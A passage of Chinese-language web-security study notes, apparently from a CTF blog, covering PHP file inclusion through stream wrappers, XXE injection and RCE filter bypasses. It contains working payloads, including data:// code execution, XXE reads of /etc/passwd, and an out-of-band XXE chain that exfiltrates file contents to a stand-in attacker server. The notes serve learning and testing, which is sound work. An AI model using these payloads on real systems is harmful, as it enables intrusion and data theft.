<code>http://ip/1.png/.php</code>解析图片为php</li></ul><h3 id="编辑器漏洞"><a href="#编辑器漏洞" class="headerlink" title="编辑器漏洞"></a>编辑器漏洞</h3><ul><li><a href="https://blog.csdn.net/weixin_45329947/article/details/122712440">Ueditor、FCKeditor、Kindeditor编辑器漏洞_kindeditor漏洞-CSDN博客</a></li></ul><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="思路要点"><a href="#思路要点" class="headerlink" title="思路要点"></a>思路要点</h3><h4 id="黑盒-1"><a href="#黑盒-1" class="headerlink" title="黑盒"></a>黑盒</h4><ul><li>主要观察<strong>参数传递</strong>的数据和文件名是否对应</li></ul><h4 id="白盒-1"><a href="#白盒-1" class="headerlink" title="白盒"></a>白盒</h4><ol><li>可通过应用功能追踪代码定位审计</li><li>可通过却本特定函数搜索定位审计</li><li>可通过<strong>伪协议</strong>玩法绕过相关修复等</li></ol><h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><p><a href="https://segmentfault.com/a/1190000018991087">PHP伪协议总结 - 个人文章 - SegmentFault 思否</a></p><h4 id="file-协议"><a href="#file-协议" class="headerlink" title="file 协议"></a>file 协议</h4><h5 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h5><ul><li><code>allow_url_fopen</code>:off&#x2F;on</li><li><code>allow_url_include</code> :off&#x2F;on</li></ul><h5 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h5><ul><li><div class="language-txt"><button title="Copy code" class="copy"></button><span class="lang">txt</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #babed8">?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</span></span></code></pre></div></li><li><div class="language-txt"><button title="Copy code" class="copy"></button><span class="lang">txt</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #babed8">?file=./phpinfo.txt</span></span></code></pre></div></li></ul><h4 id="php-协议"><a href="#php-协议" class="headerlink" title="php 协议"></a>php 协议</h4><p><strong>条件</strong></p><ul><li><code>allow_url_fopen</code>:off&#x2F;on</li><li><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp </code>需要on</li></ul><table><thead><tr><th>协议</th><th>作用</th></tr></thead><tbody><tr><td><strong>php:&#x2F;&#x2F;input</strong></td><td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input </code>是无效的。</td></tr><tr><td>php:&#x2F;&#x2F;output</td><td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td></tr><tr><td>php:&#x2F;&#x2F;fd</td><td>(&gt;&#x3D;5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td></tr><tr><td>php:&#x2F;&#x2F;memory php:&#x2F;&#x2F;temp</td><td>(&gt;&#x3D;5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td></tr><tr><td><strong>php:&#x2F;&#x2F;filter</strong></td><td>(&gt;&#x3D;5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td></tr></tbody></table><h5 id="php-filter参数详解"><a href="#php-filter参数详解" class="headerlink" title="php://filter参数详解"></a><code>php://filter</code>参数详解</h5><table><thead><tr><th>php:&#x2F;&#x2F;filter 参数</th><th>描述</th></tr></thead><tbody><tr><td>resource&#x3D;&lt;要过滤的数据流&gt;</td><td>必须项。它指定了你要筛选过滤的数据流。</td></tr><tr><td>read&#x3D;&lt;读链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（<em>\ </em>）分隔。</td></tr><tr><td>write&#x3D;&lt;写链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（\）分隔。</td></tr><tr><td>&lt;; 两个链的过滤器&gt;</td><td>任何没有以 <em>read&#x3D;</em> 或 <em>write&#x3D;</em> 作前缀的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table><p>示例:</p><p><code>php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码（针对php文件需要base64编码）</p><h4 id="data-协议"><a href="#data-协议" class="headerlink" title="data 协议"></a>data 协议</h4><h5 id="条件-2"><a href="#条件-2" class="headerlink" title="条件"></a>条件</h5><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul><h5 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h5><ul><li><div class="language-txt"><button title="Copy code" class="copy"></button><span class="lang">txt</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #babed8">?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span></span></code></pre></div></li><li><div class="language-txt"><button title="Copy code" class="copy"></button><span class="lang">txt</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #babed8">?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span></span></code></pre></div></li></ul><h4 id="http-https-协议"><a href="#http-https-协议" class="headerlink" title="http &amp; https 协议"></a>http &amp; https 协议</h4><h5 id="条件-3"><a href="#条件-3" class="headerlink" title="条件"></a>条件</h5><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul><h5 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h5><ul><li>通常用于远程包含</li></ul><h5 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h5><ul><li><div class="language-txt"><button title="Copy code" class="copy"></button><span class="lang">txt</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #babed8">?file=http://127.0.0.1/phpinfo.txt</span></span></code></pre></div></li></ul><h3 id="LFI-本地文件包含"><a href="#LFI-本地文件包含" class="headerlink" title="LFI 本地文件包含"></a>LFI 本地文件包含</h3><ul><li>通过文件上传</li><li>借助日志(UA头), session写入</li><li>伪协议+编码解码</li></ul><h2 id="XXE-–-XML-External-Entity-Injection"><a href="#XXE-–-XML-External-Entity-Injection" class="headerlink" title="XXE – XML External Entity Injection"></a>XXE – XML External Entity Injection</h2><p><a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">CTF XXE - MustaphaMond - 博客园 (cnblogs.com)</a></p><ul><li>全称为XML外部实体注入，由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的。</li><li>危害: 文件读取, 端口探针等</li></ul><h3 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><ul><li><p><code>XML</code>即 可扩展标记语言（EXtensible Markup Language），是一种标记语言，其标签没有预定义，您需要自行定义标签，是W3C的推荐标准。其于HTML的区别是：</p><ul><li>HTML 被设计用来显示数据</li><li>XML 被设计用来传输和存储数据</li></ul></li><li><p>XML文档结构包括：</p><ul><li>XML声明</li><li>DTD文档类型定义（可选）</li><li>文档元素</li></ul></li><li><p>示例:</p><div class="language-xml"><button title="Copy code" class="copy"></button><span class="lang">xml</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #676E95; font-style: italic">&lt;!--XML声明--&gt;</span></span><span class="line"><span style="color: #89DDFF">&lt;?</span><span style="color: #F07178">xml</span><span style="color: #C792EA"> version</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">&quot;</span><span style="color: #C3E88D">1.0</span><span style="color: #89DDFF">&quot;</span><span style="color: #C792EA"> encoding</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">&quot;</span><span style="color: #C3E88D">UTF-8</span><span style="color: #89DDFF">&quot;</span><span style="color: #89DDFF">?&gt;</span></span><span class="line"></span><span class="line"><span style="color: #676E95; font-style: italic">&lt;!--DTD，这部分可选的--&gt;</span><span style="color: #BABED8">          </span></span><span class="line"><span style="color: #89DDFF">&lt;!</span><span style="color: #F78C6C">DOCTYPE</span><span style="color: #89DDFF"> </span><span style="color: #BABED8">foo</span><span style="color: #89DDFF"> [ </span></span><span class="line"><span style="color: #89DDFF">    &lt;!ELEMENT foo ANY &gt;</span></span><span class="line"><span style="color: #89DDFF">    &lt;!</span><span style="color: #F78C6C">ENTITY</span><span style="color: #89DDFF"> </span><span style="color: #BABED8">xxe</span><span style="color: #F78C6C"> SYSTEM </span><span style="color: #89DDFF">&quot;</span><span style="color: #C3E88D">file:///c:/windows/win.ini</span><span style="color: #89DDFF">&quot;</span><span style="color: #89DDFF"> &gt;</span></span><span class="line"><span style="color: #89DDFF">]&gt;</span></span><span class="line"></span><span class="line"><span style="color: #676E95; font-style: italic">&lt;!--文档元素--&gt;</span><span style="color: #BABED8">                                                                          </span></span><span class="line"><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">foo</span><span style="color: #89DDFF">&gt;&amp;</span><span style="color: #BABED8">xxe</span><span style="color: #89DDFF">;&lt;/</span><span style="color: #F07178">foo</span><span style="color: #89DDFF">&gt;</span></span></code></pre></div></li></ul><h4 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h4><ul><li><p>文档类型定义（DTD）用来为XML文档定义语义约束, 可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。</p></li><li><p>DTD一般认为有两种引用或声明方式：</p><ul><li><p>1、内部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在XML文档中。</p><div class="language-txt"><button title="Copy code" class="copy"></button><span class="lang">txt</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #babed8">&lt;!DOCTYPE note [</span></span><span class="line"><span style="color: #babed8">    &lt;!ENTITY a &quot;admin&quot;&gt;</span></span><span class="line"><span style="color: #babed8">]&gt;</span></span><span class="line"><span style="color: #babed8">&lt;note&gt;&amp;a&lt;/note&gt;</span></span><span class="line"><span style="color: #babed8">&lt;!-- admin --&gt;</span></span></code></pre></div></li><li><p>2、外部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件（.dtd）中。</p><div class="language-txt"><button title="Copy code" class="copy"></button><span class="lang">txt</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #babed8">&lt;!DOCTYPE note&gt; [</span></span><span class="line"><span style="color: #babed8">    &lt;!ENTITY c SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;&gt;</span></span><span class="line"><span style="color: #babed8">]&gt;</span></span><span class="line"><span style="color: #babed8">&lt;note&gt;&amp;c&lt;/note&gt;</span></span><span class="line"><span style="color: #babed8">&lt;!-- Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA== --&gt;</span></span></code></pre></div></li></ul></li><li><p>实体声明方式:</p><ul><li><p>内部实体</p><div class="language-xml"><button title="Copy code" class="copy"></button><span class="lang">xml</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #89DDFF">&lt;!</span><span style="color: #F78C6C">DOCTYPE</span><span style="color: #89DDFF"> </span><span style="color: #BABED8">note</span><span style="color: #89DDFF"> [</span></span><span class="line"><span style="color: #89DDFF">    &lt;!</span><span style="color: #F78C6C">ENTITY</span><span style="color: #89DDFF"> </span><span style="color: #BABED8">a</span><span style="color: #89DDFF"> </span><span style="color: #89DDFF">&quot;</span><span style="color: #C3E88D">admin</span><span style="color: #89DDFF">&quot;</span><span style="color: #89DDFF">&gt;</span></span><span class="line"><span style="color: #89DDFF">]&gt;</span></span><span class="line"><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">note</span><span style="color: #89DDFF">&gt;</span><span style="color: #BABED8">&amp;a</span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">note</span><span style="color: #89DDFF">&gt;</span></span><span class="line"><span style="color: #676E95; font-style: italic">&lt;!-- admin --&gt;</span></span></code></pre></div></li><li><p>参数实体</p><div class="language-xml"><button title="Copy code" class="copy"></button><span class="lang">xml</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #89DDFF">&lt;!</span><span style="color: #F78C6C">DOCTYPE</span><span style="color: #89DDFF"> </span><span style="color: #BABED8">note</span><span style="color: #89DDFF">&gt;</span><span style="color: #BABED8"> [</span></span><span class="line"><span style="color: #BABED8">    &lt;!ENTITY % b &quot;&lt;!ENTITY b1 &quot;awsl&quot;&gt;&quot;&gt;</span></span><span class="line"><span style="color: #BABED8">    %b;</span></span><span class="line"><span style="color: #BABED8">]&gt;</span></span><span class="line"><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">note</span><span style="color: #89DDFF">&gt;</span><span style="color: #BABED8">&amp;b1</span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">note</span><span style="color: #89DDFF">&gt;</span></span><span class="line"><span style="color: #676E95; font-style: italic">&lt;!-- awsl --&gt;</span></span></code></pre></div><ul><li>参数实体用<code>% name</code>申明，引用时用<code>%name;</code>，只能在DTD中申明，DTD中引用。</li><li>其余实体直接用<code>name</code>申明，引用时用<code>&amp;name;</code>，只能在DTD中申明，可在xml文档中引用</li></ul></li><li><p>外部实体</p><div class="language-xml"><button title="Copy code" class="copy"></button><span class="lang">xml</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #89DDFF">&lt;!</span><span style="color: #F78C6C">DOCTYPE</span><span style="color: #89DDFF"> </span><span style="color: #BABED8">note</span><span style="color: #89DDFF">&gt;</span><span style="color: #BABED8"> [</span></span><span class="line"><span style="color: #BABED8">    &lt;!ENTITY c SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;&gt;</span></span><span class="line"><span style="color: #BABED8">]&gt;</span></span><span class="line"><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">note</span><span style="color: #89DDFF">&gt;</span><span style="color: #BABED8">&amp;c</span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">note</span><span style="color: #89DDFF">&gt;</span></span><span class="line"><span style="color: #676E95; font-style: italic">&lt;!-- Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA== --&gt;</span></span></code></pre></div><ul><li>外部引用可支持http，file等协议</li></ul></li><li><p>外部参数实体</p><div class="language-xml"><button title="Copy code" class="copy"></button><span class="lang">xml</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #89DDFF">&lt;!</span><span style="color: #F78C6C">DOCTYPE</span><span style="color: #89DDFF"> </span><span style="color: #BABED8">note</span><span style="color: #89DDFF">&gt;</span><span style="color: #BABED8"> [</span></span><span class="line"><span style="color: #BABED8">    &lt;!ENTITY % d SYSTEM &quot;http://47.106.143.26/xml.dtd&quot;&gt;</span></span><span class="line"><span style="color: #BABED8">    %d;</span></span><span class="line"><span style="color: #BABED8">]&gt;</span></span><span class="line"><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">note</span><span style="color: #89DDFF">&gt;</span><span style="color: #BABED8">&amp;d1</span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">note</span><span style="color: #89DDFF">&gt;</span></span><span class="line"><span style="color: #676E95; font-style: italic">&lt;!-- Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA== --&gt;</span></span></code></pre></div><p><code>http://47.106.143.26/xml.dtd</code>:</p><div class="language-xml"><button title="Copy code" class="copy"></button><span class="lang">xml</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #676E95; font-style: italic">&lt;!-- http://47.106.143.26/xml.dtd --&gt;</span></span><span class="line"><span style="color: #BABED8">&lt;!ENTITY d1 SYSTEM &quot;data://text/plain;base64,Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA==&quot;&gt;</span></span></code></pre></div></li></ul></li></ul><h3 id="XML外部实体注入-XXE"><a href="#XML外部实体注入-XXE" class="headerlink" title="XML外部实体注入(XXE)"></a>XML外部实体注入(XXE)</h3><h4 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h4><h5 id="黑盒-2"><a href="#黑盒-2" class="headerlink" title="黑盒"></a>黑盒</h5><ul><li>获取得到Content-Type或数据类型为xml时，尝试进行xml语言payload进行测试</li><li>不管获取的Content-Type类型或数据传输类型，均可尝试修改后提交测试XXE</li><li>XXE不仅在数据传输上可能存在漏洞，同样在文件上传引用插件解析或预览也会造成文件中的XXE Payload被执行</li></ul><h5 id="白盒-2"><a href="#白盒-2" class="headerlink" title="白盒"></a>白盒</h5><ul><li><p>可通过应用功能追踪代码定位审计</p></li><li><p>可通过脚本特定函数搜索定位审计</p></li><li><p>可通过伪协议玩法绕过相关修复等</p></li></ul><h4 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h4><h5 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h5><ul><li><p>直接读靶机文件</p><div class="language-xml"><button title="Copy code" class="copy"></button><span class="lang">xml</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #89DDFF">&lt;?</span><span style="color: #F07178">xml</span><span style="color: #C792EA"> version</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">&quot;</span><span style="color: #C3E88D">1.0</span><span style="color: #89DDFF">&quot;</span><span style="color: #C792EA"> encoding</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">&quot;</span><span style="color: #C3E88D">UTF-8</span><span style="color: #89DDFF">&quot;</span><span style="color: #89DDFF"> ?&gt;</span></span><span class="line"><span style="color: #89DDFF">&lt;!</span><span style="color: #F78C6C">DOCTYPE</span><span style="color: #89DDFF"> </span><span style="color: #BABED8">foo</span><span style="color: #89DDFF"> [ </span></span><span class="line"><span style="color: #89DDFF">&lt;!</span><span style="color: #F78C6C">ENTITY</span><span style="color: #89DDFF"> </span><span style="color: #BABED8">rabbit</span><span style="color: #F78C6C"> SYSTEM </span><span style="color: #89DDFF">&quot;</span><span style="color: #C3E88D">file:///flag</span><span style="color: #89DDFF">&quot;</span><span style="color: #89DDFF"> &gt;</span></span><span class="line"><span style="color: #89DDFF">]&gt;</span></span><span class="line"><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">user</span><span style="color: #89DDFF">&gt;&lt;</span><span style="color: #F07178">username</span><span style="color: #89DDFF">&gt;&amp;</span><span style="color: #BABED8">rabbit</span><span style="color: #89DDFF">;&lt;/</span><span style="color: #F07178">username</span><span style="color: #89DDFF">&gt;&lt;</span><span style="color: #F07178">password</span><span style="color: #89DDFF">&gt;</span><span style="color: #BABED8">123</span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">password</span><span style="color: #89DDFF">&gt;&lt;/</span><span style="color: #F07178">user</span><span style="color: #89DDFF">&gt;</span></span></code></pre></div></li><li><p>恶意引入外部参数实体</p><div class="language-xml"><button title="Copy code" class="copy"></button><span class="lang">xml</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #89DDFF">&lt;?</span><span style="color: #F07178">xml</span><span style="color: #C792EA"> version</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">&quot;</span><span style="color: #C3E88D">1.0</span><span style="color: #89DDFF">&quot;</span><span style="color: #89DDFF"> ?&gt;</span></span><span class="line"><span style="color: #89DDFF">&lt;!</span><span style="color: #F78C6C">DOCTYPE</span><span style="color: #89DDFF"> </span><span style="color: #BABED8">test</span><span style="color: #89DDFF"> [</span></span><span class="line"><span style="color: #89DDFF">    &lt;!</span><span style="color: #F78C6C">ENTITY</span><span style="color: #89DDFF"> % </span><span style="color: #BABED8">file</span><span style="color: #F78C6C"> SYSTEM </span><span style="color: #89DDFF">&quot;</span><span style="color: #C3E88D">http://vps-ip/hack.dtd</span><span style="color: #89DDFF">&quot;</span><span style="color: #89DDFF">&gt;</span></span><span class="line"><span style="color: #89DDFF">    %file;</span></span><span class="line"><span style="color: #89DDFF">]&gt;</span></span><span class="line"><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">test</span><span style="color: #89DDFF">&gt;&amp;</span><span style="color: #BABED8">hhh</span><span style="color: #89DDFF">;&lt;/</span><span style="color: #F07178">test</span><span style="color: #89DDFF">&gt;</span></span></code></pre></div><p>hack.dtd:</p><div class="language-xml"><button title="Copy code" class="copy"></button><span class="lang">xml</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #BABED8">&lt;!ENTITY hhh SYSTEM &#39;file:///etc/passwd&#39;&gt;</span></span></code></pre></div></li></ul><h5 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h5><ul><li><p>先使用php:&#x2F;&#x2F;filter获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器(攻击服务器)xxx.xxx.xxx。</p><div class="language-xml"><button title="Copy code" class="copy"></button><span class="lang">xml</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #89DDFF">&lt;!</span><span style="color: #F78C6C">DOCTYPE</span><span style="color: #89DDFF"> </span><span style="color: #BABED8">updateProfile</span><span style="color: #89DDFF"> [</span></span><span class="line"><span style="color: #89DDFF">    &lt;!</span><span style="color: #F78C6C">ENTITY</span><span style="color: #89DDFF"> % </span><span style="color: #BABED8">file</span><span style="color: #F78C6C"> SYSTEM </span><span style="color: #89DDFF">&quot;</span><span style="color: #C3E88D">php://filter/read=convert.base64-encode/resource=./target.php</span><span style="color: #89DDFF">&quot;</span><span style="color: #89DDFF">&gt;</span></span><span class="line"><span style="color: #89DDFF">    &lt;!</span><span style="color: #F78C6C">ENTITY</span><span style="color: #89DDFF"> % </span><span style="color: #BABED8">dtd</span><span style="color: #F78C6C"> SYSTEM </span><span style="color: #89DDFF">&quot;</span><span style="color: #C3E88D">http://xxx.xxx.xxx/evil.dtd</span><span style="color: #89DDFF">&quot;</span><span style="color: #89DDFF">&gt;</span></span><span class="line"><span style="color: #89DDFF">    %dtd;</span></span><span class="line"><span style="color: #89DDFF">    %send;</span></span><span class="line"><span style="color: #89DDFF">]&gt;</span></span></code></pre></div><p>evil.dtd:</p><div class="language-xml"><button title="Copy code" class="copy"></button><span class="lang">xml</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #BABED8">&lt;!ENTITY % all</span></span><span class="line"><span style="color: #BABED8">    &quot;&lt;!ENTITY </span><span style="color: #89DDFF">&amp;</span><span style="color: #BABED8">#x25</span><span style="color: #89DDFF">;</span><span style="color: #BABED8"> send SYSTEM &#39;http://xxx.xxx.xxx/?data=%file;&#39;&gt;&quot;</span></span><span class="line"><span style="color: #BABED8">&gt;</span></span><span class="line"><span style="color: #BABED8">%all;</span></span></code></pre></div></li></ul><h3 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h3><ul><li><p>svg</p></li><li><p>excel</p><p><a href="https://xz.aliyun.com/t/3741">利用EXCEL进行XXE攻击 - 先知社区 (aliyun.com)</a></p></li></ul><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ul><li>禁用dtd实体引用</li><li>过滤关键词</li></ul><h2 id="RCE-–-远程代码执行漏洞"><a href="#RCE-–-远程代码执行漏洞" class="headerlink" title="RCE – 远程代码执行漏洞"></a>RCE – 远程代码执行漏洞</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><ul><li><p><strong>系统命令执行函数</strong></p><div class="language-apl"><button title="Copy code" class="copy"></button><span class="lang">apl</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #BABED8">system</span><span style="color: #89DDFF">()</span></span><span class="line"><span style="color: #BABED8">passthru</span><span style="color: #89DDFF">()</span></span><span class="line"><span style="color: #BABED8">exec</span><span style="color: #89DDFF">()</span></span><span class="line"><span style="color: #BABED8">shell_exec</span><span style="color: #89DDFF">()</span></span><span class="line"><span style="color: #BABED8">popen</span><span style="color: #89DDFF">()</span></span><span class="line"><span style="color: #BABED8">proc_open</span><span style="color: #89DDFF">()</span></span><span class="line"><span style="color: #BABED8">pcntl_exec</span><span style="color: #89DDFF">()</span></span></code></pre></div></li><li><p><strong>系统命令拼接方式</strong></p><ul><li><code>|</code> , <code>||</code></li><li><code>&amp;</code>, <code>&amp;&amp;</code></li><li><code>;</code></li><li><code>%0a</code></li></ul></li></ul><h3 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h3><p><a href="https://blog.csdn.net/jdhellfire/article/details/121969060">常见操作系统命令注入思路_命令注入 bypass-CSDN博客</a></p><h4 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h4><div class="language-php"><button title="Copy code" class="copy"></button><span class="lang">php</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #82AAFF">system</span><span style="color: #89DDFF">(</span><span style="color: #BABED8">‘tac fla</span><span style="color: #89DDFF">*</span><span style="color: #89DDFF">.</span><span style="color: #BABED8">php’</span><span style="color: #89DDFF">);</span></span></code></pre></div><h4 id="参数逃逸"><a href="#参数逃逸" class="headerlink" title="参数逃逸"></a>参数逃逸</h4><div class="language-php"><button title="Copy code" class="copy"></button><span class="lang">php</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #82AAFF">eval</span><span style="color: #89DDFF">($</span><span style="color: #BABED8">GET</span><span style="color: #89DDFF">[</span><span style="color: #F78C6C">1</span><span style="color: #89DDFF">]);&amp;</span><span style="color: #F78C6C">1</span><span style="color: #89DDFF">=</span><span style="color: #82AAFF">system</span><span style="color: #89DDFF">(</span><span style="color: #BABED8">‘tac flag</span><span style="color: #89DDFF">.</span><span style="color: #BABED8">php’</span><span style="color: #89DDFF">);</span></span></code></pre></div><h4 id="包含-伪协议"><a href="#包含-伪协议" class="headerlink" title="包含&amp;伪协议"></a>包含&amp;伪协议</h4><div class="language-php"><button title="Copy code" class="copy"></button><span class="lang">php</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #BABED8">include</span><span style="color: #89DDFF">$</span><span style="color: #BABED8">_ GET</span><span style="color: #89DDFF">[</span><span style="color: #BABED8">a</span><span style="color: #89DDFF">]?&gt;</span><span style="color: #C792EA">&amp;</span><span style="color: #BABED8">a</span><span style="color: #89DDFF">=</span><span style="color: #BABED8">data</span><span style="color: #89DDFF">:</span><span style="color: #676E95; font-style: italic">//text/plain,&lt;?=system(&#39;tac flag.php&#39;);</span><span style="color: #89DDFF">?&gt;</span></span><span class="line"><span style="color: #BABED8">include</span><span style="color: #89DDFF">$</span><span style="color: #BABED8">_GET</span><span style="color: #89DDFF">[</span><span style="color: #BABED8">a</span><span style="color: #89DDFF">]?&gt;</span><span style="color: #C792EA">&amp;</span><span style="color: #BABED8">a</span><span style="color: #89DDFF">=</span><span style="color: #BABED8">php</span><span style="color: #89DDFF">:</span><span style="color: #676E95; font-style: italic">//filter/read=convert.base64-encode/resource=flag.php</span></span></code></pre></div><h4 id="花括号"><a href="#花括号" class="headerlink" title="花括号{}"></a>花括号<code>&#123;&#125;</code></h4><ul><li>在Linux bash中还可以使用<code>&#123;xxxx&#125;</code>来执行系统命令</li></ul><div class="language-sh"><button title="Copy code" class="copy"></button><span class="lang">sh</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #89DDFF">&#123;</span><span style="color: #FFCB6B">cat,flag&#125;</span></span></code></pre></div><h4 id="斜杠"><a href="#斜杠" class="headerlink" title="斜杠"></a>斜杠</h4><ul><li><p>路径 &#x2F;</p></li><li><p>\是在正则等语法里面，表示后面跟的字符是正常字符，不需要转义。</p></li><li><p>也就意味着，我们可以在rce漏洞，过滤掉<code>cat ls</code>等命令时候，直接使用<code>ca\t</code>来实现绕过</p></li></ul><h4 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h4><ul><li>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等</li></ul><h4 id="一些命令分隔符"><a href="#一些命令分隔符" class="headerlink" title="一些命令分隔符"></a>一些命令分隔符</h4><p>linux中：<code>%0a(回车) 、%0d(换行) 、; 、&amp; 、| 、&amp;&amp;、||</code><br>windows中：<code>%0a、&amp;、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符）</code></p><h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><h4 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a>拼接绕过</h4><ul><li>利用偶读拼接方法绕过黑名单：<code>a=fl;b=ag;cat $a$b</code></li><li>利用.拼接绕过(sy.(st).em)</li></ul><h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><div class="language-sh"><button title="Copy code" class="copy"></button><span class="lang">sh</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span 